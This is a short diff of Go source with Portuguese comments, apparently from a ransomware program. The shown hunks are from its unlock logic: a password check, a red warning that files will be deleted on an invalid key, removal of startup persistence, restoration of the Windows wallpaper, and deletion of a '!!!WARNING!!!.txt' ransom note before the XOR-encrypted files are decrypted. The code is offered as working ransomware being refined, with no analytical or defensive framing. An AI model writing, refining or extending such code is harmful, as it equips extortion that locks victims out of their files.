@@ -26,7 +26,7 @@ func xorEncrypt(data []byte) []byte {
 }
 
 func restoreDefaultWallpaper() {
-	defaultWallpaper := `C:\Windows\Web\Wallpaper\Windows\img0.jpg`
+	defaultWallpaper := `C:\Windows\Web\Wallpaper\Windows\img0.jpg` // Wallpaper padrão do Windows 11
 	user32 := windows.NewLazySystemDLL("user32.dll")
 	systemParameters := user32.NewProc("SystemParametersInfoW")
 
@@ -62,24 +62,17 @@ func main() {
 
 	if inputKey != password {
 		fmt.Print("\033[31m")
-		fmt.Println(`  
-        ⚠️⚠️⚠️ CHAVE INVÁLIDA! ⚠️⚠️⚠️  
-        SEUS ARQUIVOS SERÃO DELETADOS EM 10 SEGUNDOS!  
-        `)
+		fmt.Println("⚠️ CHAVE INVÁLIDA! OS ARQUIVOS SERÃO DELETADOS!")
 		fmt.Print("\033[0m")
 		time.Sleep(10 * time.Second)
 		return
 	}
 
-	// Remover persistência
 	removeFromStartup()
-
-	// Restaurar wallpaper padrão
 	restoreDefaultWallpaper()
 
-	// Apagar arquivos residuais
+	// Remover arquivo de aviso
 	os.Remove(filepath.Join(targetDir, "!!!WARNING!!!.txt"))
-	os.Remove(filepath.Join(targetDir, "wallpaper.jpg")) // <--- NOVO!
 
 	// Descriptografar arquivos
 	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
